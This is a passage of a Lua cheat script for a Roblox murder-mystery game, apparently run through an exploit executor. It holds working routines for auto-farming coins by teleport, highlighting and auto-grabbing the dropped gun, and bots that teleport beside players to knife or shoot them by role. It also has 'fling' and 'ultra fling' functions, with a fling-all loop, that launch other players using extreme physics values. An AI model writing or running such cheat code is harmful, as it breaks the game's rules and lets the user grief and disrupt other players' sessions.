				targetDeadline=os.clock()+math.clamp(4+(promotedDistance/math.max(autoCoinSpeed,8))*1.4,5,10)
				detourPosition=nil; wallSince=0; stuckJumps=0; stuckFailures=0
			else
				target=nil; NOKia.coinTarget=nil; targetDeadline=nil; lastPlanAt=0
				task.wait()
				continue
			end
		end

		local murderer=NOKia.getMurdererRoot()
		local danger=false
		if murderer then
			local toMurderer=murderer.Position-root.Position
			local toTarget=target.Position-root.Position
			local ahead=toTarget.Magnitude>0 and toMurderer.Magnitude>0 and toMurderer.Unit:Dot(toTarget.Unit)>.15
			local closing=false
			if toMurderer.Magnitude>0 then
				local towardUs=murderer.AssemblyLinearVelocity:Dot((root.Position-murderer.Position).Unit)
				closing=towardUs>7 and toMurderer.Magnitude<38
			end
			danger=toMurderer.Magnitude<26 or (ahead and toMurderer.Magnitude<45) or closing
			if danger then evadeUntil=os.clock()+1.2 end
			if flags.autoCoinAvoidWalls and flags.coinTeleportWhenDanger and danger and os.clock()-lastEmergencyTeleport>.8 then
				local safeCoin=NOKia.selectEmergencyCoin(root.Position,murderer.Position)
				if safeCoin then
					pcall(function() root.CFrame=CFrame.new(safeCoin.Position+Vector3.new(0,3,0)); root.AssemblyLinearVelocity=Vector3.zero end)
					target=safeCoin; NOKia.coinTarget=target; NOKia.coinPlan=NOKia.planCoins(safeCoin.Position,safeCoin)
					targetSince=os.clock(); targetPathDistance=(safeCoin.Position-root.Position).Magnitude; targetDeadline=os.clock()+6
				end
				lastEmergencyTeleport=os.clock(); waypoints=nil; detourPosition=nil; replans=0
				task.wait(.05)
				continue
			end
		end
		local evading=os.clock()<evadeUntil
		if evading~=wasEvading then waypoints=nil; wasEvading=evading end
		local speed=autoCoinSpeed+(evading and 2 or 0)
		pcall(function() humanoid.PlatformStand=not flags.autoCoinAvoidWalls; humanoid.WalkSpeed=speed end)

		if flags.autoCoinAvoidWalls then
			NOKia.recollide(humanoid)
			local destination=NOKia.coinNavPosition(target,character)
			if evading and murderer then
				local away=root.Position-murderer.Position
				if away.Magnitude<1 then away=root.CFrame.RightVector else away=away.Unit end
				local side=Vector3.new(-away.Z,0,away.X)
				destination=root.Position+away*22+side*((math.floor(os.clock()*2)%2==0) and 10 or -10)
				if os.clock()-lastJumpAt>.38 then humanoid.Jump=true; lastJumpAt=os.clock() end
			end
			if detourPosition and (os.clock()>detourUntil or (root.Position-detourPosition).Magnitude<3) then
				detourPosition=nil; waypoints=nil
			end
			if detourPosition and not evading then destination=detourPosition end
			if not waypoints or os.clock()-lastPathAt>1.25 then
				waypoints=NOKia.computeCoinPath(root.Position,destination)
				waypointIndex=2; lastPathAt=os.clock(); replans=replans+1
			end
			local waypoint=waypoints and waypoints[waypointIndex]
			local movePosition=waypoint and waypoint.Position or destination
			local lowWall,highWall=NOKia.inspectWall(root,movePosition,character)
			if lowWall then
				if wallSince==0 then wallSince=os.clock() end
				if not highWall and os.clock()-lastJumpAt>.48 then
					humanoid.Jump=true
					pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
					lastJumpAt=os.clock()
				elseif highWall and os.clock()-wallSince>.22 and not evading then
					detourPosition=NOKia.pickWallDetour(root,movePosition,character)
					detourUntil=os.clock()+2.8; waypoints=nil; wallSince=0
				end
			else wallSince=0 end
			if waypoint then
				if waypoint.Action==Enum.PathWaypointAction.Jump then humanoid.Jump=true end
				humanoid:MoveTo(waypoint.Position)
				if (root.Position-waypoint.Position).Magnitude<3 then waypointIndex=waypointIndex+1 end
			else
				humanoid:MoveTo(destination)
			end
			if lastPosition and (root.Position-lastPosition).Magnitude>.7 then lastPosition=root.Position; lastMovedAt=os.clock(); stuckJumps=0; stuckFailures=0
			elseif os.clock()-lastMovedAt>1.35 then
				stuckFailures=stuckFailures+1
				if flags.coinTeleportWhenStuck and stuckFailures>=3 and os.clock()-lastEmergencyTeleport>.8 then
					pcall(function() root.CFrame=CFrame.new(target.Position+Vector3.new(0,3,0)); root.AssemblyLinearVelocity=Vector3.zero end)
					lastEmergencyTeleport=os.clock(); waypoints=nil; detourPosition=nil; replans=0; stuckFailures=0
					task.wait(.05)
					continue
				elseif stuckJumps<2 then
					humanoid.Jump=true
					pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)
					stuckJumps=stuckJumps+1
				else
					detourPosition=NOKia.pickWallDetour(root,movePosition,character)
					detourUntil=os.clock()+3; stuckJumps=0
				end
				waypoints=nil; lastMovedAt=os.clock(); lastPosition=root.Position
				if replans>=7 and not evading then NOKia.farmBlack[target]=os.clock()+7; target=nil end
			end
		else
			uncollide(character)
			local dt=RunService.RenderStepped:Wait()
			local direction=target.Position-root.Position
			if direction.Magnitude>2 then root.CFrame=CFrame.new(root.Position+direction.Unit*math.min(direction.Magnitude,speed*dt)); root.AssemblyLinearVelocity=Vector3.zero end
		end

		if target and target.Parent and typeof(firetouchinterest)=="function" then
			pcall(function() firetouchinterest(root,target,0); firetouchinterest(root,target,1) end)
		end
		if target and targetDeadline and os.clock()>=targetDeadline then
			if flags.autoCoinAvoidWalls and flags.coinTeleportWhenStuck and os.clock()-lastEmergencyTeleport>.8 then
				pcall(function() root.CFrame=CFrame.new(target.Position+Vector3.new(0,3,0)); root.AssemblyLinearVelocity=Vector3.zero end)
				lastEmergencyTeleport=os.clock(); targetDeadline=os.clock()+2; waypoints=nil; detourPosition=nil; replans=0
			else
				NOKia.farmBlack[target]=os.clock()+10; target=nil; NOKia.coinTarget=nil; targetDeadline=nil
			end
		end
		task.wait(flags.autoCoinAvoidWalls and .04 or 0)
	end
end)

-- Player -> coin 1 -> coin 2 ... up to the next 10 planned coins.
NOKia.coinPathLines={}
for index=1,10 do NOKia.coinPathLines[index]=NOKia.newLine(index==1 and 3 or 2) end
bind(RunService.RenderStepped,function()
	local root=getHRP(LocalPlayer.Character)
	local enabled=(flags.autoCoins or roleBotNeedsCoins()) and flags.coinPath and root
	local fromPosition=root and root.Position
	for index,line in ipairs(NOKia.coinPathLines) do
		local coin=enabled and NOKia.coinPlan[index]
		if coin and coin.Parent and not coinTaken(coin) and fromPosition then
			local a=Camera:WorldToViewportPoint(fromPosition)
			local b=Camera:WorldToViewportPoint(coin.Position)
			if a.Z>0 and b.Z>0 then
				line.From=Vector2.new(a.X,a.Y); line.To=Vector2.new(b.X,b.Y)
				line.Color=index==1 and Color3.fromRGB(255,220,70) or Color3.fromRGB(90,210,255)
				line.Transparency=index==1 and .95 or .72; line.Visible=true
			else line.Visible=false end
			fromPosition=coin.Position
		else line.Visible=false end
	end
end)

local function findDroppedGun()
	for _,p in ipairs(CollectionService:GetTagged("GunDrop")) do
		if p:IsA("BasePart") and p:IsDescendantOf(workspace) then return p end
	end
	for _,d in ipairs(workspace:GetChildren()) do
		if d:IsA("BasePart") and d.Name=="GunDrop" then return d end
		if d:IsA("Model") then
			local g=d:FindFirstChild("GunDrop")
			if g and g:IsA("BasePart") then return g end
		end
	end
end
local droppedGun
local gunEspHL,gunEspBB
task.spawn(function() while not Library.Unloaded do
		local h=flags.gunEsp and droppedGun or nil
		if h and h.Parent then
			if not gunEspHL then gunEspHL=create("Highlight",{Name=rnd(),FillColor=Color3.fromRGB(90,150,255),FillTransparency=0.35,OutlineColor=Color3.fromRGB(170,210,255),OutlineTransparency=0,DepthMode=Enum.HighlightDepthMode.AlwaysOnTop,Parent=EspGui}) end
			if not gunEspBB then
				gunEspBB=create("BillboardGui",{Name=rnd(),Size=UDim2.fromOffset(160,18),AlwaysOnTop=true,StudsOffsetWorldSpace=Vector3.new(0,2,0),Parent=EspGui},
				{create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Font=Enum.Font.GothamBold,TextSize=12,TextColor3=Color3.fromRGB(140,190,255),TextStrokeTransparency=.4,Text="GUN"})})
			end
			gunEspHL.Adornee=h; gunEspHL.Enabled=true
			gunEspBB.Adornee=h; gunEspBB.Enabled=flags.gunEspDist
			if flags.gunEspDist then
				local hrp=getHRP(LocalPlayer.Character)
				local dist=hrp and math.floor((h.Position-hrp.Position).Magnitude) or 0
				local lbl=gunEspBB:FindFirstChildOfClass("TextLabel"); if lbl then lbl.Text="DROPPED GUN  ·  "..dist.."m" end
			end
		else
			if gunEspHL then gunEspHL.Enabled=false end
			if gunEspBB then gunEspBB.Enabled=false end
		end
		task.wait(0.1)
	end end)
local grabbing=false
local function touchGun(h)
	local hrp=getHRP(LocalPlayer.Character)
	if not (hrp and h and h.Parent) then return false end
	if typeof(firetouchinterest)=="function" then
		pcall(function()
			for _=1,4 do
				firetouchinterest(hrp,h,0)
				firetouchinterest(hrp,h,1)
			end
		end)
	end
	return findWeapon("Gun")~=nil
end
function NOKia.canAct()
	if NOKia.teleporting() then return false end
	local ch=LocalPlayer.Character
	if not ch or not ch.Parent then return false end
	local hum=ch:FindFirstChildOfClass("Humanoid")
	if not (hum and hum.Health>0) then return false end
	if not getHRP(ch) then return false end
	if LocalPlayer:GetAttribute("Alive")==false then return false end
	local d=roundData(LocalPlayer)
	if d and d.Dead==true then return false end
	return true
end

-- The lobby can still contain the dropped gun from a match already in progress.
-- Only a player with CurrentRoundClient data is actually participating in that round.
function NOKia.isInActiveRound()
	local data=roundData(LocalPlayer)
	return type(data)=="table" and data.Dead~=true and type(data.Role)=="string" and #data.Role>0
end

local function findSheriffTarget()
	local hero
	for _,plr in ipairs(NOKia.plrs) do
		if plr~=LocalPlayer and alive(plr) then
			local role=roleOf(plr)
			if role=="Sheriff" then return plr end
			if role=="Hero" then hero=plr end
		end
	end
	if hero then return hero end
	if flags.killRemainingAfterSheriff then
		for _,plr in ipairs(NOKia.plrs) do
			if plr~=LocalPlayer and alive(plr) then return plr end
		end
	end
end

-- These perform one deliberate role attack.  The repeating bots below simply call
-- the same routines on a timer, while the keybind uses them once.
local function attackSheriffOnce()
	if murdererSheriffBusy or myRole()~="Murderer" or not NOKia.canAct() then return false end
	local target=findSheriffTarget()
	local ch=LocalPlayer.Character
	local hum=ch and ch:FindFirstChildOfClass("Humanoid")
	local hrp=getHRP(ch)
	local targetRoot=target and getHRP(target.Character)
	local knife=findWeapon("Knife")
	if not (hum and hrp and targetRoot and knife) then return false end
	murdererSheriffBusy=true
	local returnTo=hrp.CFrame
	pcall(function()
		equip(knife)
		RunService.Heartbeat:Wait()
		knife=findWeapon("Knife")
		local events=knife and knife:FindFirstChild("Events")
		if not events then return end
		uncollide(ch)
		local inFront=targetRoot.Position-targetRoot.CFrame.LookVector*2.5
		hrp.CFrame=CFrame.new(inFront,targetRoot.Position)
		hrp.AssemblyLinearVelocity=Vector3.zero
		RunService.Heartbeat:Wait()
		knifeKill(events,target.Character)
		RunService.Heartbeat:Wait()
	end)
	if hrp.Parent then hrp.CFrame=returnTo; hrp.AssemblyLinearVelocity=Vector3.zero end
	NOKia.recollide(hum)
	murdererSheriffBusy=false
	return true
end

local function shootMurdererOnce()
	if sheriffMurdererBusy or not isGunRole(myRole()) or not NOKia.canAct() then return false end
	local target=findMurderer()
	local ch=LocalPlayer.Character
	local hum=ch and ch:FindFirstChildOfClass("Humanoid")
	local hrp=getHRP(ch)
	local targetRoot=target and alive(target) and getHRP(target.Character)
	local gun=findWeapon("Gun")
	if not (hum and hrp and targetRoot and gun) then return false end
	sheriffMurdererBusy=true
	local returnTo=hrp.CFrame
	pcall(function()
		equip(gun)
		RunService.Heartbeat:Wait()
		gun=findWeapon("Gun")
		if not gun then return end
		uncollide(ch)
		local firingSpot=targetRoot.Position-targetRoot.CFrame.LookVector*7
		hrp.CFrame=CFrame.new(firingSpot,targetRoot.Position)
		hrp.AssemblyLinearVelocity=Vector3.zero
		RunService.Heartbeat:Wait()
		shootGunAt(NOKia.aimPointFor(target),true)
		RunService.Heartbeat:Wait()
	end)
	if hrp.Parent then hrp.CFrame=returnTo; hrp.AssemblyLinearVelocity=Vector3.zero end
	NOKia.recollide(hum)
	sheriffMurdererBusy=false
	return true
end
task.spawn(function()
	while not Library.Unloaded do
		if flags.murdererSheriffBot and roleBotCanRun() and not murdererSheriffBusy and myRole()=="Murderer" and NOKia.canAct() then
			attackSheriffOnce()
		end
		task.wait(0.35)
	end
end)

task.spawn(function()
	while not Library.Unloaded do
		if flags.sheriffMurdererBot and roleBotCanRun() and not sheriffMurdererBusy and isGunRole(myRole()) and NOKia.canAct() then
			shootMurdererOnce()
		end
		task.wait(0.45)
	end
end)

local function grabGunOnce(target)
	if grabbing then return false end
	local h=target or droppedGun or findDroppedGun()
	local hrp=getHRP(LocalPlayer.Character)
	if not (h and h.Parent and hrp and NOKia.canAct() and NOKia.isInActiveRound()) then return false end
	grabbing=true
	if touchGun(h) then
		notify("Grabbed the Sheriff gun")
		grabbing=false
		return true
	end
	local back=hrp.CFrame
	for _=1,10 do
		local myhrp=getHRP(LocalPlayer.Character)
		if not (myhrp and h.Parent) then break end
		if not (NOKia.canAct() and NOKia.isInActiveRound()) then break end
		myhrp.CFrame=CFrame.new(h.Position); myhrp.AssemblyLinearVelocity=Vector3.zero
		if touchGun(h) then break end
		RunService.Heartbeat:Wait()
	end
	local myhrp=getHRP(LocalPlayer.Character)
	if myhrp then myhrp.CFrame=back; myhrp.AssemblyLinearVelocity=Vector3.zero end
	local got=findWeapon("Gun")~=nil
	if got then notify("Grabbed the Sheriff gun") end
	grabbing=false
	return got
end
local function onGunAppeared(inst)
	if not (inst and inst:IsA("BasePart") and inst:IsDescendantOf(workspace)) then return end
	droppedGun=inst
	if flags.autoGun and not grabbing and myRole()~="Murderer" and not findWeapon("Gun") and NOKia.canAct() and NOKia.isInActiveRound() then
		task.spawn(grabGunOnce,inst)
	end
end
pcall(function()
	bind(CollectionService:GetInstanceAddedSignal("GunDrop"),onGunAppeared)
	bind(CollectionService:GetInstanceRemovedSignal("GunDrop"),function(i)
		if droppedGun==i then droppedGun=nil end
	end)
end)
bind(workspace.DescendantAdded,function(d)
	if d.Name=="GunDrop" then task.defer(onGunAppeared,d) end
end)
task.spawn(function() while not Library.Unloaded do
		if flags.gunEsp or flags.autoGun then
			local g=findDroppedGun()
			droppedGun=g
			if g and flags.autoGun and not grabbing and myRole()~="Murderer" and not findWeapon("Gun") and NOKia.canAct() and NOKia.isInActiveRound() then
				grabGunOnce(g)
			end
		elseif droppedGun then droppedGun=nil end
		task.wait(0.1)
	end end)

local fbStore
local function setFullbright(on)
	if on then fbStore=fbStore or {Lighting.Brightness,Lighting.ClockTime,Lighting.GlobalShadows,Lighting.Ambient}
		Lighting.Brightness=2;Lighting.ClockTime=14;Lighting.GlobalShadows=false;Lighting.Ambient=Color3.fromRGB(140,140,140)
	elseif fbStore then Lighting.Brightness,Lighting.ClockTime,Lighting.GlobalShadows,Lighting.Ambient=fbStore[1],fbStore[2],fbStore[3],fbStore[4]; fbStore=nil end end
local fpsStore,fpsConn
local function fxKill(e,store)
	if store[e]~=nil then return end
	if e:IsA("PostEffect") then if e.Enabled then e.Enabled=false; store[e]={"en"} end
	elseif e:IsA("ParticleEmitter") or e:IsA("Trail") or e:IsA("Smoke") or e:IsA("Fire") or e:IsA("Sparkles") or e:IsA("Beam") then if e.Enabled then e.Enabled=false; store[e]={"en"} end
	elseif e:IsA("Decal") or e:IsA("Texture") then store[e]={"tr",e.Transparency}; e.Transparency=1
	elseif e:IsA("SurfaceAppearance") then store[e]={"par",e.Parent}; e.Parent=nil end
end
local function setFPSBoost(on)
	if on then
		fpsStore={changed={},shadows=Lighting.GlobalShadows}; Lighting.GlobalShadows=false
		local terrain=workspace:FindFirstChildOfClass("Terrain")
		if terrain then fpsStore.water={terrain.WaterWaveSize,terrain.WaterWaveSpeed,terrain.WaterReflectance}; terrain.WaterWaveSize=0;terrain.WaterWaveSpeed=0;terrain.WaterReflectance=0 end
		fpsConn=workspace.DescendantAdded:Connect(function(e) if flags.fpsBoost and fpsStore then task.defer(fxKill,e,fpsStore.changed) end end)
		task.spawn(function() local s=fpsStore.changed; local n=0
			for _,e in ipairs(Lighting:GetDescendants()) do fxKill(e,s) end
			for _,e in ipairs(workspace:GetDescendants()) do if not (flags.fpsBoost and fpsStore) then return end fxKill(e,s); n+=1; if n%900==0 then RunService.Heartbeat:Wait() end end
		end)
	elseif fpsStore then
		local s=fpsStore.changed; Lighting.GlobalShadows=fpsStore.shadows
		local terrain=workspace:FindFirstChildOfClass("Terrain")
		if terrain and fpsStore.water then terrain.WaterWaveSize,terrain.WaterWaveSpeed,terrain.WaterReflectance=fpsStore.water[1],fpsStore.water[2],fpsStore.water[3] end
		if fpsConn then fpsConn:Disconnect();fpsConn=nil end; fpsStore=nil
		task.spawn(function() local n=0 for e,info in pairs(s) do pcall(function()
					if info[1]=="en" then e.Enabled=true elseif info[1]=="tr" then e.Transparency=info[2] elseif info[1]=="par" then e.Parent=info[2] end end)
				n+=1; if n%900==0 then RunService.Heartbeat:Wait() end end end)
	end
end
unstick=function(ch)
	if not ch then return end
	local hrp=getHRP(ch); if not hrp then return end
	task.spawn(function()
		local params=RaycastParams.new()
		params.FilterType=Enum.RaycastFilterType.Exclude
		params.FilterDescendantsInstances={ch}
		local from=hrp.Position+Vector3.new(0,6,0)
		local hit=workspace:Raycast(from,Vector3.new(0,-200,0),params)
		if hit then
			hrp.CFrame=CFrame.new(hit.Position+Vector3.new(0,3.5,0))
		else
			hrp.CFrame=hrp.CFrame+Vector3.new(0,4,0)
		end
		hrp.AssemblyLinearVelocity=Vector3.zero
		RunService.Heartbeat:Wait()
		for _,p in ipairs(getCharParts(ch)) do
			if p.Parent and p.Name~="HumanoidRootPart" then p.CanCollide=true end
		end
	end)
end
local function tpTo(pos)
	local hrp=getHRP(LocalPlayer.Character); if not hrp then return end
	hrp.CFrame=CFrame.new(pos+Vector3.new(0,3,0))
end

local function resolvePlayer(v)
	if typeof(v)=="Instance" and v:IsA("Player") then return v end
	if type(v)=="table" then
		for k,on in pairs(v) do
			local cand=(on==true) and k or on
			if typeof(cand)=="Instance" and cand:IsA("Player") then return cand end
			if type(cand)=="string" then local p=resolvePlayer(cand); if p then return p end end
		end
		return nil
	end
	if type(v)=="string" and #v>0 then
		local p=Players:FindFirstChild(v); if p and p:IsA("Player") then return p end
		local lv=v:lower()
		for _,q in ipairs(NOKia.plrs) do
			if q.Name:lower()==lv or (q.DisplayName or ""):lower()==lv then return q end
		end
	end
	return nil
end

local function flingPlayer(p,keepPos)
	if flinging or NOKia.safetyStopFling then return false end
	local myCh=LocalPlayer.Character; local myHrp=getHRP(myCh)
	local hum=myCh and myCh:FindFirstChildOfClass("Humanoid")
	local tHrp=p and p.Character and getHRP(p.Character)
	if not (myHrp and hum and tHrp) then return false end
	flinging=true
	local back=keepPos or myHrp.CFrame
	local restore={}
	for _,pp in ipairs(myCh:GetDescendants()) do
		if pp:IsA("BasePart") then
			restore[pp]={pp.CustomPhysicalProperties,pp.Massless,pp.CanCollide}
			pp.CustomPhysicalProperties=PhysicalProperties.new(100,0.3,0.5)
			pp.Massless=true; pp.CanCollide=false; pp.AssemblyLinearVelocity=Vector3.zero
		end
	end
	local bav=Instance.new("BodyAngularVelocity")
	local flingSpeed=NOKia.FLING_POWER
	bav.Name=rnd(); bav.AngularVelocity=Vector3.new(0,flingSpeed,0); bav.MaxTorque=Vector3.new(0,math.huge,0); bav.P=math.huge; bav.Parent=myHrp
	local t0=os.clock(); local spinning,phaseAt=true,os.clock()
	while os.clock()-t0<NOKia.FLING_SECONDS do
		if NOKia.teleporting() or NOKia.safetyStopFling then break end
		local h=getHRP(LocalPlayer.Character); local t=p.Character and getHRP(p.Character)
		if not (h and t and bav.Parent) then break end
		local now=os.clock()
		if spinning and now-phaseAt>=0.2 then bav.AngularVelocity=Vector3.zero; spinning=false; phaseAt=now
		elseif (not spinning) and now-phaseAt>=0.1 then bav.AngularVelocity=Vector3.new(0,NOKia.FLING_POWER,0); spinning=true; phaseAt=now end
		local aim=t.Position+t.AssemblyLinearVelocity*netPing(); local off=aim-h.Position; local dist=off.Magnitude
		if dist>0.05 then h.CFrame=CFrame.new(h.Position+off.Unit*math.min(dist,NOKia.FLING_STEP)) end
		RunService.Stepped:Wait()
	end
	if bav and bav.Parent then bav:Destroy() end
	for pp,v in pairs(restore) do
		if pp and pp.Parent then pp.CustomPhysicalProperties=v[1]; pp.Massless=v[2]; pp.CanCollide=v[3]; pp.AssemblyLinearVelocity=Vector3.zero; pp.AssemblyAngularVelocity=Vector3.zero end
	end
	local home=CFrame.new(back.Position+Vector3.new(0,4,0))
	for _=1,6 do
		local ch2=LocalPlayer.Character; if not ch2 then break end
		for _,pp in ipairs(getCharParts(ch2)) do if pp.Parent then pp.AssemblyLinearVelocity=Vector3.zero; pp.AssemblyAngularVelocity=Vector3.zero end end
		RunService.Heartbeat:Wait()
	end
	local h2=getHRP(LocalPlayer.Character)
	if h2 then h2.CFrame=home; h2.AssemblyLinearVelocity=Vector3.zero; h2.AssemblyAngularVelocity=Vector3.zero end
	local watch=os.clock()
	while os.clock()-watch<2.5 do
		RunService.Heartbeat:Wait(); if NOKia.teleporting() then break end
		local h3=getHRP(LocalPlayer.Character); if not h3 then break end; local lv=h3.AssemblyLinearVelocity
		if lv.Magnitude>140 or h3.AssemblyAngularVelocity.Magnitude>40 or (h3.Position-home.Position).Magnitude>25 then h3.AssemblyLinearVelocity=Vector3.zero; h3.AssemblyAngularVelocity=Vector3.zero; h3.CFrame=home end
	end
	flinging=false
	return true
end

-- Ultra Fling uses the contact/velocity pattern from flingscript.lua.  It is
-- deliberately separate: the normal old.lua fling routine above is untouched.
NOKia.ultraFlingPlayer=function(target,keepPos)
	if flinging or NOKia.safetyStopFling then return false end
	local character=LocalPlayer.Character
	local humanoid=character and character:FindFirstChildOfClass("Humanoid")
	local root=humanoid and humanoid.RootPart
	local targetCharacter=target and target.Character
	local targetHumanoid=targetCharacter and targetCharacter:FindFirstChildOfClass("Humanoid")
	local targetRoot=targetHumanoid and targetHumanoid.RootPart
	if not (character and humanoid and root and targetCharacter) then return false end
	local targetHead=targetCharacter:FindFirstChild("Head")
	local accessory=targetCharacter:FindFirstChildOfClass("Accessory")
	local targetPart=targetRoot or targetHead or (accessory and accessory:FindFirstChild("Handle"))
	if not (targetPart and targetPart:IsA("BasePart")) then return false end

	flinging=true
	local home=keepPos or root.CFrame
	local oldCameraSubject=Camera.CameraSubject
	local oldFallenHeight=workspace.FallenPartsDestroyHeight
	local bodyVelocity
	local seatedWasEnabled=true
	pcall(function() seatedWasEnabled=humanoid:GetStateEnabled(Enum.HumanoidStateType.Seated) end)
	local ok,err=xpcall(function()
		if targetHead then Camera.CameraSubject=targetHead else Camera.CameraSubject=targetPart end
		pcall(function() workspace.FallenPartsDestroyHeight=0/0 end)
		bodyVelocity=Instance.new("BodyVelocity")
		bodyVelocity.Name=rnd(); bodyVelocity.Velocity=Vector3.zero; bodyVelocity.MaxForce=Vector3.new(9e9,9e9,9e9); bodyVelocity.Parent=root
		pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false) end)
		local started=os.clock(); local angle=0
		while os.clock()-started<2 and not NOKia.safetyStopFling do
			if not (root.Parent and targetPart.Parent and target.Character==targetCharacter) then break end
			local moving=targetPart.AssemblyLinearVelocity.Magnitude>=50
			local direction=targetHumanoid and targetHumanoid.MoveDirection or Vector3.zero
			local walkSpeed=targetHumanoid and targetHumanoid.WalkSpeed or 16
			local function hit(offset,rotation)
				local cf=CFrame.new(targetPart.Position)*offset*rotation
				root.CFrame=cf
				pcall(function() character:PivotTo(cf) end)
				root.AssemblyLinearVelocity=Vector3.new(9e7,9e8,9e7)
				root.AssemblyAngularVelocity=Vector3.new(9e8,9e8,9e8)
			end
			if moving then
				hit(CFrame.new(0,1.5,walkSpeed),CFrame.Angles(math.rad(90),0,0)); RunService.Heartbeat:Wait()
				hit(CFrame.new(0,-1.5,-walkSpeed),CFrame.new()); RunService.Heartbeat:Wait()
			else
				angle+=100
				local lead=direction*math.min(targetPart.AssemblyLinearVelocity.Magnitude/1.25,30)
				hit(CFrame.new(0,1.5,0)+lead,CFrame.Angles(math.rad(angle),0,0)); RunService.Heartbeat:Wait()
				hit(CFrame.new(0,-1.5,0)+lead,CFrame.Angles(math.rad(angle),0,0)); RunService.Heartbeat:Wait()
			end
		end
	end,debug.traceback)
	if bodyVelocity then pcall(function() bodyVelocity:Destroy() end) end
	pcall(function() humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,seatedWasEnabled) end)
	pcall(function() workspace.FallenPartsDestroyHeight=oldFallenHeight end)
	pcall(function() Camera.CameraSubject=oldCameraSubject or humanoid end)
	local currentRoot=getHRP(LocalPlayer.Character)
	if currentRoot then
		currentRoot.CFrame=home*CFrame.new(0,.5,0)
		for _,part in ipairs(getCharParts(LocalPlayer.Character)) do part.AssemblyLinearVelocity=Vector3.zero; part.AssemblyAngularVelocity=Vector3.zero end
		pcall(function() humanoid:ChangeState(Enum.HumanoidStateType.GettingUp) end)
	end
	flinging=false
	if not ok then warn("[NOKia] Ultra Fling recovered: "..tostring(err)) end
	return ok
end

NOKia.flingWithMode=function(p,keepPos)
	if NOKia.safetyStopFling then return false end
	local restoreAntiFling=flags.pauseAntiFlingDuringFling and flags.antiFling
	if restoreAntiFling then
		-- Disable the guard just before our physics routine begins, then put it
		-- back exactly as it was once we return.
		NOKia.antiFlingPausedByFling=true
		flags.antiFling=false
	end
	local ok,result=xpcall(function()
		if not flags.ultraFling then return flingPlayer(p,keepPos) end
		return NOKia.ultraFlingPlayer(p,keepPos)
	end,debug.traceback)
	if restoreAntiFling then
		flags.antiFling=true
		NOKia.antiFlingPausedByFling=false
	end
	if not ok then warn("[NOKia] Fling recovered: "..tostring(result)); return false end
	return result==true
end

-- One key emergency stop: it only changes local script state and never sends
-- anything to Roblox or the Nokia service.
NOKia.activateSafetyMode=function()
	NOKia.safetyStopFling=true
	NOKia.coinBurstCancel=true
	for _,name in ipairs({
		"Fly","Noclip","AutoCoins","AutoKill","MurdererSheriffBot","SheriffMurdererBot",
		"CoinBagBeforeRoleBot","CoinLimitBeforeRoleBot","AutoFlingMurd","AutoFlingSher",
		"AutoFlingSelected","AutoGun","CoinTeleportWhenStuck","CoinTeleportWhenDanger"
	}) do
		local control=Toggles[name]
		if control and control.Value then pcall(function() control:SetValue(false) end) end
	end
	for _,name in ipairs({"fly","noclip","autoCoins","autoKill","murdererSheriffBot","sheriffMurdererBot","coinBagBeforeRoleBot","coinLimitBeforeRoleBot","autoFlingMurderer","autoFlingSheriff","autoFlingSelected","autoGun","coinTeleportWhenStuck","coinTeleportWhenDanger"}) do
		flags[name]=false
	end
	stopFly()
	local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if hum then NOKia.recollide(hum) end
	notify("Safety mode: fly, noclip, bots, fling and teleports stopped",4)
	task.spawn(function()
		while flinging or NOKia.coinBurstBusy do task.wait() end
		NOKia.safetyStopFling=false
	end)
end
local function flingAll()
	local myHrp=getHRP(LocalPlayer.Character)
	if not myHrp then notify("You have no character"); return end
	local home=myHrp.CFrame
	task.spawn(function()
		local n=0
		for _,p in ipairs(NOKia.plrs) do
			if p~=LocalPlayer and p.Character and getHRP(p.Character) and alive(p) then
				if NOKia.flingWithMode(p,home) then n=n+1 end
				task.wait(0.1)
			end
		end
		local h=getHRP(LocalPlayer.Character)
		if h then h.CFrame=home; h.AssemblyLinearVelocity=Vector3.zero end
		notify("Flung "..n.." player"..(n==1 and "" or "s"))
	end)
end
task.spawn(function() while not Library.Unloaded do
		if (flags.autoFlingMurderer or flags.autoFlingSheriff or flags.autoFlingSelected)
			and alive(LocalPlayer) and not flinging and not NOKia.teleporting() then
			local want
			if flags.autoFlingSelected and Options.TpPlayer then
				local selected=resolvePlayer(Options.TpPlayer.Value)
				if selected and selected~=LocalPlayer and alive(selected) and selected.Character and getHRP(selected.Character) then want=selected end
			end
			if not want then
				for _,p in ipairs(NOKia.plrs) do
					if p~=LocalPlayer and alive(p) and p.Character and getHRP(p.Character) then
						local r=roleOf(p)
						if (flags.autoFlingMurderer and r=="Murderer")
							or (flags.autoFlingSheriff and isGunRole(r)) then
							want=p; break
						end
					end
				end
			end
			if want then NOKia.flingWithMode(want) end
		end
		task.wait(0.5)
	end end)

local MURD_ALERT_RANGE=50
local murdNotif=nil
local murdLastShown=nil
local function closeMurdNotif()
	if murdNotif then
		pcall(function() murdNotif:Destroy() end)
		murdNotif=nil
		murdLastShown=nil
	end
end
bind(RunService.Heartbeat,function()
	if not flags.murdererNotify then closeMurdNotif() return end
	local hrp=getHRP(LocalPlayer.Character)
	local m=findMurderer()
	local mh=(m and m~=LocalPlayer and alive(m)) and getHRP(m.Character) or nil
	if not (hrp and mh) then closeMurdNotif() return end
	local d=math.floor((mh.Position-hrp.Position).Magnitude)
	if d>MURD_ALERT_RANGE then closeMurdNotif() return end
	if not murdNotif then
		local ok,res=pcall(function()
			return Library:Notify({
				Title="Murderer Nearby",
				Description=m.Name.."   "..d.."m",
				Persist=true,
			})
		end)
		murdNotif=ok and res or nil
		murdLastShown=d
	elseif d~=murdLastShown then
		murdLastShown=d
		pcall(function() murdNotif:ChangeDescription(m.Name.."   "..d.."m") end)
	end
end)

local GiveWeaponR=GameplayR:FindFirstChild("GiveWeapon")
if GiveWeaponR then bind(GiveWeaponR.OnClientEvent,function(w) if w=="Knife" or w=="Gun" then notify("You are the "..(w=="Knife" and "MURDERER" or "SHERIFF").."!",3) end end) end

do
	local function feedNotify(name,killType,role)
		local tag = role and (" ["..(role=="Murderer" and "M" or isGunRole(role) and "S" or "I").."]") or ""
		Library:Notify({Title="Kill Feed",Description=tostring(name)..tag.."  ·  "..tostring(killType or "Eliminated"),Time=4})
	end
	local recentKillEvent={}
	local KillEventR=GameplayR:FindFirstChild("KillEvent")
